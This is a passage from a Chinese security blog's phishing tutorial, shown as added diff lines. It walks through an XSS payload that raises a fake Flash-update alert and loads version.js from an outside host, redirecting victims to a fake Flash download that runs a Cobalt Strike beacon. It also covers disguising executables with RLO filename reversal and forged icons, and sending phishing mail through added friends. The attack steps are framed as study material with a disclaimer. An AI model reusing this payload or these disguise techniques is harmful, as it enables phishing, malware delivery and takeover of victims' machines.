+<p>再把version.js放进钓鱼网站里，然后修改其跳转地址为<a target="_blank" rel="noopener" href="http://www.flash.com/">http://www.flash.com</a></p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1609996151028-e5854bda-4407-4182-8bce-b1b748f4496a.png" alt="img"></p>
+<p>打开xss靶场</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1609996196888-a8511925-5113-4c9b-8f82-3516fdf6d966.png" alt="img"></p>
+<p>输入xss代码，插入进去后刷新页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(&quot;您的FLASH版本过低，尝试升级后访问该页面&quot;)&lt;/script&gt;&lt;script src=&quot;http://www.flash.com/version.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1610004448194-36d990bb-80a5-4440-a238-dce6fdafe070.png" alt="img"></p>
+<p>点击确定后跳转到flash钓鱼页面</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1610004500323-19fd50f2-c89d-4505-babc-9f621ece7080.png" alt="img"></p>
+<p>点击下载</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1610012345771-b3973731-c2b8-4123-a0dc-12836a9d75a4.png" alt="img"></p>
+<p>双击打开</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1610012602255-a44e8cf1-965d-4621-a203-f4bc3a637500.png" alt="img"></p>
+<p>查看cobaltstrike，发现主机上线成功</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1610012684378-23152705-a33e-4daf-8b87-9bd22bee24c6.png" alt="img"></p>
+<h2 id="四、一些小Tips"><a href="#四、一些小Tips" class="headerlink" title="四、一些小Tips"></a>四、一些小Tips</h2><h3 id="RTL（文件名伪装）："><a href="#RTL（文件名伪装）：" class="headerlink" title="RTL（文件名伪装）："></a>RTL（文件名伪装）：</h3><p>RLO是微软的一个中东Unicode字符8238，或者0x202E，可以使后面的字符都变为RTL（阿拉伯语从右往左书写，对我们来说就是倒着的），可以简单用于改变文件的真实扩展名，进行文件名欺骗，引诱人下载恶意程序。</p>
+<p>以a.exe举例，由于这里我为了方便，所以直接新建了个txt文本，图标没刷新过来</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1659378903449-863f4c42-975f-4ec2-b20f-1f5275219ea6.png" alt="img"></p>
+<p>修改名称为agpj.exe</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1659378978401-40bd79c0-60c0-46b0-a60e-6e5943cf1d58.png" alt="img"></p>
+<p>接着继续修改名称，在a后面右键，选择插入Unicode控制字符-&gt;RLO</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1659379047032-0702ca51-5764-4b7a-ad77-d241367ef4ec.png" alt="img"></p>
+<h3 id="伪造图标："><a href="#伪造图标：" class="headerlink" title="伪造图标："></a>伪造图标：</h3><p>这里使用的工具为Restorator，就不放链接了，百度一搜就有</p>
+<p>打开需要伪造的exe</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1659379940036-777cdadb-49bb-403d-93ab-fe1b898cd527.png" alt="img"></p>
+<p>右键rg.exe，选择添加资源 –&gt; 图标，名称为1</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1659379958894-3c8c5f6b-bd7b-49fb-a2a9-abea91d4e295.png" alt="img"></p>
+<p>随后将ico图片拉进去进行保存即可</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1659379994489-528efff3-3d07-4aa7-b63a-f31415fc0c15.png" alt="img"></p>
+<h3 id="必杀技："><a href="#必杀技：" class="headerlink" title="必杀技："></a>必杀技：</h3><p>通过添加好友直接发送钓鱼邮件，用的好有奇效</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1659424025329-cd047831-fc39-46ae-bd91-8a24c2fdc53c.png" alt="img"></p>
+<h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>钓鱼的方法有很多，这里仅仅介绍了几种常见的手法，除了以上几种，还有一些webshell后门、import投毒、CHM电子书等手段，但是要记住，在钓鱼攻击开展之前，一定要好好进行准备，不论是免杀亦或是隐藏，开弓没有回头箭，以上仅作学习研究，切勿用于违法犯罪。</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/fishing/1659380488505-e8d06701-1928-40c8-96b2-4c2a295cd12b.webp" alt="img"></p>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2022/07/10/defender/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">Windows Defender - Bypass</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/blog/blog.jpg" class="soft-size--round soft-style--box" alt="WsyKer">
+    
+    
+      <h2>WsyKer</h2>
+    
+    
+      <p>要做自己喜欢做的事</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>9</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        6
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        3
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>一个热爱打游戏打篮球的脚本小子，欢迎找我闲聊</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">
+            内网安全 (3)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/">
+            神兵利器 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97/">
+            杀软对抗 (2)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/">
+            硬件安全 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">
+            红蓝对抗 (1)
+          </a>
+        </li>
+      
+        <li class="categorys-list-item">
+          <a href="/categories/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/">
+            中间件安全 (1)
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8/" style="font-size: 10px;" class="tags-cloud-0">中间件安全</a> <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" style="font-size: 20px;" class="tags-cloud-10">内网安全</a> <a href="/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/" style="font-size: 10px;" class="tags-cloud-0">硬件安全</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/WsyKer" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+      
+    </div>
+     
+    <p>&copy; 2022 <a href="/" target="_blank">WsyKer</a></p>
+
+    
+      <p><a href="https://beian.miit.gov.cn" target="_blank">豫ICP备2021003558号</a></p>
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
